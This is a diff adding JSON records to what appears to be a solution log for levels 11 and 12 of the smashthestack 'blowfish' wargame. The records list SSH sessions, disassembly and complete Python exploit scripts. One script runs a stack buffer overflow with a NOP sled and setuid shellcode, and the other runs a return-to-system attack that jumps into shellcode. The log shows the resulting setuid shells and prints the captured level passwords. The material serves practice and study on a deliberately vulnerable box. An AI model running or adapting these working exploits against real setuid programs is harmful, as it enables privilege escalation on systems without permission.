@@ -721,6 +721,427 @@
     }
    ],
    "note": "PATH hijack on system(\"clear\"). The binary calls setuid(geteuid()) then system(\"clear\") before the password game: the clear command runs through sh -c with PATH under our control, and the child keeps euid=level11. We put a script named 'clear' (cat /pass/level11) first on PATH; the game itself always fails (strlen never equals the magic compare), but by then our clear has already printed the level11 password. Verified live 2026-11-25: phj33r_tuX, level11 login confirmed."
+  },
+  {
+   "lvl": 11,
+   "user": "level11",
+   "pw": "phj33r_tuX",
+   "steps": [
+    {
+     "cmd": "ssh -p 2222 level11@blowfish.smashthestack.org",
+     "out": [
+      "level11@blowfish:~$ "
+     ]
+    },
+    {
+     "cmd": "cat ~/README",
+     "out": [
+      "Good luck! ;)"
+     ]
+    },
+    {
+     "cmd": "ls -la /levels/level11",
+     "out": [
+      "-rwsr-x--- 1 level12 level11 11588 Jul 21  2011 /levels/level11"
+     ]
+    },
+    {
+     "cmd": "objdump -d /levels/level11 --start-address=0x80483f4 --stop-address=0x804844c",
+     "out": [
+      " 804841e:\te8 e9 fe ff ff       \tcall   804830c <strncpy@plt>",
+      " 8048429:\te8 be fe ff ff       \tcall   80482ec <strlen@plt>",
+      " 804842e:\t83 f8 07             \tcmp    $0x7,%eax",
+      " 8048431:\t75 17                \tjne    804844a <main+0x56>",
+      " 8048445:\te8 d2 fe ff ff       \tcall   804831c <strcpy@plt>",
+      " 804844b:\tc3                   \tret"
+     ]
+    },
+    {
+     "cmd": "cat /proc/sys/kernel/randomize_va_space",
+     "out": [
+      "0"
+     ]
+    },
+    {
+     "cmd": "readelf -lW /levels/level11 | grep GNU_STACK",
+     "out": [
+      "  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/e_bf11.py",
+     "out": [
+      "",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/e_bf11.py",
+     "out": [
+      "import struct, os, pty, time, select, sys, tty, signal",
+      "# level11: strncpy(buf[8], argv[2], 16) with a strlen(buf)==7 gate on argv[2],",
+      "# then strcpy(buf, argv[1]) unbounded. buf sits at ebp-0x8, so the saved return",
+      "# address is 12 bytes into argv[1]. ASLR off, stack RWE: the usual 55-byte setuid",
+      "# shellcode behind a NOP sled, probing the top of the stack (this kernel maps the",
+      "# stack just under 0xc0000000, not 0xffffxxxx).",
+      "sc = \"31c0b0c9cd8089c389c131c0b046cd8031c0b0c9cd8089c331c0b017cd8031c050682f2f7368682f62696e89e3505389e131d2b00bcd80\".decode(\"hex\")",
+      "def payload_for(addr):",
+      "    return \"A\" * 12 + struct.pack(\"<I\", addr) + \"\\x90\" * 800 + sc",
+      "def reap():",
+      "    while True:",
+      "        try:",
+      "            w, st = os.waitpid(-1, os.WNOHANG)",
+      "        except OSError:",
+      "            return",
+      "        if w == 0:",
+      "            return",
+      "def probe(addr):",
+      "    reap()",
+      "    pid, fd = pty.fork()",
+      "    if pid == 0:",
+      "        os.execve(\"/levels/level11\", [\"/levels/level11\", payload_for(addr), \"1234567\"], {})",
+      "        os._exit(1)",
+      "    tty.setraw(fd)",
+      "    time.sleep(0.8)",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/e_bf11.py",
+     "out": [
+      "    os.write(fd, \"id\\n\\n\\n\")",
+      "    out = \"\"",
+      "    deadline = time.time() + 0.8",
+      "    while time.time() < deadline:",
+      "        r, _, _ = select.select([fd], [], [], 0.05)",
+      "        if r:",
+      "            try:",
+      "                out += os.read(fd, 4096)",
+      "            except OSError:",
+      "                break",
+      "        if \"uid=\" in out:",
+      "            break",
+      "    try:",
+      "        os.close(fd)",
+      "    except OSError:",
+      "        pass",
+      "    reap()",
+      "    return \"uid=1012\" in out",
+      "found = None",
+      "for addr in range(0xbffff000, 0xbffffe00, 16):",
+      "    if \"\\x00\" in struct.pack(\"<I\", addr):",
+      "        continue",
+      "    if probe(addr):",
+      "        found = addr",
+      "        print \"landed at\", hex(addr)",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/e_bf11.py",
+     "out": [
+      "        sys.stdout.flush()",
+      "        break",
+      "else:",
+      "    print \"no hit\"",
+      "    sys.exit(1)",
+      "pid, fd = pty.fork()",
+      "if pid == 0:",
+      "    os.execve(\"/levels/level11\", [\"/levels/level11\", payload_for(found), \"1234567\"], {})",
+      "    os._exit(1)",
+      "tty.setraw(fd)",
+      "time.sleep(1.5)",
+      "os.write(fd, \"id\\ncat /pass/level12\\n\")",
+      "out = \"\"",
+      "deadline = time.time() + 10",
+      "while time.time() < deadline:",
+      "    r, _, _ = select.select([fd], [], [], 0.1)",
+      "    if r:",
+      "        try:",
+      "            out += os.read(fd, 4096)",
+      "        except OSError:",
+      "            break",
+      "    if \"/pass/level12\" in out and out.count(\"sh-3.2$\") >= 3:",
+      "        break",
+      "sys.stdout.write(out)",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/e_bf11.py",
+     "out": [
+      "import struct, os, pty, time, select, sys, tty, signal",
+      "# level11: strncpy(buf[8], argv[2], 16) with a strlen(buf)==7 gate on argv[2],",
+      "# then strcpy(buf, argv[1]) unbounded. buf sits at ebp-0x8, so the saved return",
+      "# address is 12 bytes into argv[1]. ASLR off, stack RWE: the usual 55-byte setuid",
+      "# shellcode behind a NOP sled, probing the top of the stack (this kernel maps the",
+      "# stack just under 0xc0000000, not 0xffffxxxx).",
+      "sc = \"31c0b0c9cd8089c389c131c0b046cd8031c0b0c9cd8089c331c0b017cd8031c050682f2f7368682f62696e89e3505389e131d2b00bcd80\".decode(\"hex\")",
+      "def payload_for(addr):",
+      "    return \"A\" * 12 + struct.pack(\"<I\", addr) + \"\\x90\" * 800 + sc",
+      "def reap():",
+      "    while True:",
+      "        try:",
+      "            w, st = os.waitpid(-1, os.WNOHANG)",
+      "        except OSError:",
+      "            return",
+      "        if w == 0:",
+      "            return",
+      "def probe(addr):",
+      "    reap()",
+      "    pid, fd = pty.fork()",
+      "    if pid == 0:",
+      "        os.execve(\"/levels/level11\", [\"/levels/level11\", payload_for(addr), \"1234567\"], {})",
+      "        os._exit(1)",
+      "    tty.setraw(fd)",
+      "    time.sleep(0.8)",
+      "    os.write(fd, \"id\\n\\n\\n\")",
+      "    out = \"\"",
+      "    deadline = time.time() + 0.8",
+      "    while time.time() < deadline:",
+      "        r, _, _ = select.select([fd], [], [], 0.05)",
+      "        if r:",
+      "            try:",
+      "                out += os.read(fd, 4096)",
+      "            except OSError:",
+      "                break",
+      "        if \"uid=\" in out:",
+      "            break",
+      "    try:",
+      "        os.close(fd)",
+      "    except OSError:",
+      "        pass",
+      "    reap()",
+      "    return \"uid=1012\" in out",
+      "found = None",
+      "for addr in range(0xbffff000, 0xbffffe00, 16):",
+      "    if \"\\x00\" in struct.pack(\"<I\", addr):",
+      "        continue",
+      "    if probe(addr):",
+      "        found = addr",
+      "        print \"landed at\", hex(addr)",
+      "        sys.stdout.flush()",
+      "        break",
+      "else:",
+      "    print \"no hit\"",
+      "    sys.exit(1)",
+      "pid, fd = pty.fork()",
+      "if pid == 0:",
+      "    os.execve(\"/levels/level11\", [\"/levels/level11\", payload_for(found), \"1234567\"], {})",
+      "    os._exit(1)",
+      "tty.setraw(fd)",
+      "time.sleep(1.5)",
+      "os.write(fd, \"id\\ncat /pass/level12\\n\")",
+      "out = \"\"",
+      "deadline = time.time() + 10",
+      "while time.time() < deadline:",
+      "    r, _, _ = select.select([fd], [], [], 0.1)",
+      "    if r:",
+      "        try:",
+      "            out += os.read(fd, 4096)",
+      "        except OSError:",
+      "            break",
+      "    if \"/pass/level12\" in out and out.count(\"sh-3.2$\") >= 3:",
+      "        break",
+      "sys.stdout.write(out)",
+      "~",
+      "\"/dev/shm/e_bf11.py\" 75L, 2270C written",
+      ""
+     ]
+    },
+    {
+     "cmd": "python /dev/shm/e_bf11.py",
+     "out": [
+      "landed at 0xbffffb10L",
+      "sh-3.2$ uid=1012(level12) gid=1011(level11) groups=1011(level11)",
+      "sh-3.2$ em_kcuF"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": []
+    }
+   ],
+   "note": "strncpy(buf[8], argv[2], 16) gates on strlen(buf)==7 (argv[2] exactly 7 chars), then unbounded strcpy(buf, argv[1]): buf at ebp-0x8 -> saved ret at offset 12. ASLR off, GNU_STACK RWE: 12-byte prefix + ret + 800-byte NOP sled + 55-byte setuid shellcode in argv[1], probe the stack top - this kernel maps the stack just under 0xc0000000 (NOT 0xffffxxxx like the older games' boxes), first probe run hit the per-user fork limit (ulimit -u 20) until the probe reaped its children before/after every fork. Landed 0xbffffb10 -> uid=1012(level12), /pass/level12 = em_kcuF (level12 login verified live 2026-11-25)."
+  },
+  {
+   "lvl": 12,
+   "user": "level12",
+   "pw": "em_kcuF",
+   "steps": [
+    {
+     "cmd": "ssh -p 2222 level12@blowfish.smashthestack.org",
+     "out": [
+      "level12@blowfish:~$ "
+     ]
+    },
+    {
+     "cmd": "cat ~/README",
+     "out": [
+      "Only one more level to go after this ;)",
+      "Have fun"
+     ]
+    },
+    {
+     "cmd": "ls -la /levels/level12",
+     "out": [
+      "-rwsr-x--- 1 level13 level12 11804 Jul 21  2011 /levels/level12"
+     ]
+    },
+    {
+     "cmd": "objdump -d /levels/level12 --start-address=0x804845b --stop-address=0x80484c7",
+     "out": [
+      " 804845b:\t83 7d 08 02          \tcmpl   $0x2,0x8(%ebp)",
+      " 804845f:\t7f 0a                \tjg     804846b <main+0x20>",
+      " 8048461:\t8b 45 10             \tmov    0x10(%ebp),%eax",
+      " 8048464:\t83 38 00             \tcmpl   $0x0,(%eax)",
+      " 8048467:\t75 02                \tjne    804846b <main+0x20>",
+      " 8048483:\t8b 45 0c             \tmov    0xc(%ebp),%eax",
+      " 8048496:\te8 75 fe ff ff       \tcall   8048310 <strchr@plt>",
+      " 80484c2:\te8 5d ff ff ff       \tcall   8048424 <func>"
+     ]
+    },
+    {
+     "cmd": "objdump -d /lib/libc-2.7.so --start-address=0x37eb0 --stop-address=0x37ec0 | tail -6",
+     "out": [
+      "   37eb3:\t89 7c 24 08          \tmov    %edi,0x8(%esp)",
+      "   37eb7:\t8b 7c 24 10          \tmov    0x10(%esp),%edi",
+      "   37ebb:\t89 1c 24             \tmov    %ebx,(%esp)",
+      "   37ebe:\te8 cc e3 fd ff       \tcall   1628f <_Unwind_Find_FDE@plt+0x77>",
+      "Disassembly of section __libc_freeres_fn:",
+      "Disassembly of section __libc_thread_freeres_fn:"
+     ]
+    },
+    {
+     "cmd": "cat /proc/sys/kernel/randomize_va_space",
+     "out": [
+      "0"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/p12.py",
+     "out": [
+      "",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/p12.py",
+     "out": [
+      "import struct, os, pty, time, select, sys, tty",
+      "# level12: argc must be 2, env must be EMPTY, argv[1] must not contain 0xbf.",
+      "# func() strncpy(buf[56], argv[1], 0x40) - 64 bytes into a 56-byte slot: the saved",
+      "# return address at buf+60 is fully ours. The stack itself is off limits (every",
+      "# stack address starts with 0xbf, which strchr rejects), but system@libc is not",
+      "# (0xb7ed4eb0). At func's ret, esp points at the slot holding &argv[1], and that",
+      "# slot IS system's return address: system(sh -c garbage) runs, returns straight",
+      "# into our argv[1] string as code - so the payload starts with the 55-byte setuid",
+      "# shellcode, padded to 60, then the system address.",
+      "sc = \"31c0b0c9cd8089c389c131c0b046cd8031c0b0c9cd8089c331c0b017cd8031c050682f2f7368682f62696e89e3505389e131d2b00bcd80\".decode(\"hex\")",
+      "SYSTEM = 0xb7ed4eb0",
+      "payload = sc + \"\\x90\" * (60 - len(sc)) + struct.pack(\"<I\", SYSTEM)",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/p12.py",
+     "out": [
+      "pid, fd = pty.fork()",
+      "if pid == 0:",
+      "    os.execve(\"/levels/level12\", [\"/levels/level12\", payload], {})",
+      "    os._exit(1)",
+      "tty.setraw(fd)",
+      "time.sleep(1.5)",
+      "os.write(fd, \"id\\ncat /pass/level13\\n\\n\")",
+      "out = \"\"",
+      "deadline = time.time() + 8",
+      "while time.time() < deadline:",
+      "    r, _, _ = select.select([fd], [], [], 0.1)",
+      "    if r:",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/p12.py",
+     "out": [
+      "        try:",
+      "            d = os.read(fd, 4096)",
+      "        except OSError:",
+      "            break",
+      "        if not d:",
+      "            break",
+      "        out += d",
+      "    if \"uid=\" in out:",
+      "        time.sleep(0.6)",
+      "        try:",
+      "            out += os.read(fd, 4096)",
+      "        except OSError:",
+      "            pass",
+      "        break",
+      "sys.stdout.write(out)",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/p12.py",
+     "out": [
+      "import struct, os, pty, time, select, sys, tty",
+      "# level12: argc must be 2, env must be EMPTY, argv[1] must not contain 0xbf.",
+      "# func() strncpy(buf[56], argv[1], 0x40) - 64 bytes into a 56-byte slot: the saved",
+      "# return address at buf+60 is fully ours. The stack itself is off limits (every",
+      "# stack address starts with 0xbf, which strchr rejects), but system@libc is not",
+      "# (0xb7ed4eb0). At func's ret, esp points at the slot holding &argv[1], and that",
+      "# slot IS system's return address: system(sh -c garbage) runs, returns straight",
+      "# into our argv[1] string as code - so the payload starts with the 55-byte setuid",
+      "# shellcode, padded to 60, then the system address.",
+      "sc = \"31c0b0c9cd8089c389c131c0b046cd8031c0b0c9cd8089c331c0b017cd8031c050682f2f7368682f62696e89e3505389e131d2b00bcd80\".decode(\"hex\")",
+      "SYSTEM = 0xb7ed4eb0",
+      "payload = sc + \"\\x90\" * (60 - len(sc)) + struct.pack(\"<I\", SYSTEM)",
+      "pid, fd = pty.fork()",
+      "if pid == 0:",
+      "    os.execve(\"/levels/level12\", [\"/levels/level12\", payload], {})",
+      "    os._exit(1)",
+      "tty.setraw(fd)",
+      "time.sleep(1.5)",
+      "os.write(fd, \"id\\ncat /pass/level13\\n\\n\")",
+      "out = \"\"",
+      "deadline = time.time() + 8",
+      "while time.time() < deadline:",
+      "    r, _, _ = select.select([fd], [], [], 0.1)",
+      "    if r:",
+      "        try:",
+      "            d = os.read(fd, 4096)",
+      "        except OSError:",
+      "            break",
+      "        if not d:",
+      "            break",
+      "        out += d",
+      "    if \"uid=\" in out:",
+      "        time.sleep(0.6)",
+      "        try:",
+      "            out += os.read(fd, 4096)",
+      "        except OSError:",
+      "            pass",
+      "        break",
+      "sys.stdout.write(out)",
+      "~",
+      "\"/dev/shm/p12.py\" [New] 40L, 1510C written",
+      ""
+     ]
+    },
+    {
+     "cmd": "python /dev/shm/p12.py",
+     "out": [
+      "sh-3.2$ uid=1013(level13) gid=1012(level12) groups=1012(level12)",
+      "sh-3.2$ 0n3_m0r3."
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": []
+    }
+   ],
+   "note": "strncpy(buf[56], argv[1], 0x40): 64 bytes into a 56-byte slot -> saved ret at buf+60 fully controlled. Gates: argc<=2, envp[0]==NULL (env must be EMPTY), strchr(argv[1], 0xbf)==NULL (no 0xbf byte = no stack addresses in the payload). ASLR off, libc base 0xb7e9d000 fixed. The win: ret=system@libc (0xb7ed4eb0, bytes b0 4e ed b7 - legal); at func's ret esp points at the slot holding &argv[1], which IS system's return address: system(sh -c garbage) runs and returns straight into the payload string as code - payload = 55-byte setuid shellcode first, padded to 60, then the system address. uid=1013(level13), /pass/level13 = 0n3_m0r3. (level13 login verified live 2026-11-25). Stack layout measured under gdb: [esp+4] at func-ret = 0x08048360 (_start, system's fixed garbage arg); note /lib/snoopy.so is mapped box-wide (exec auditing) and gdb injects env vars that trip the envp check."
   }
  ],
  "goals": {}
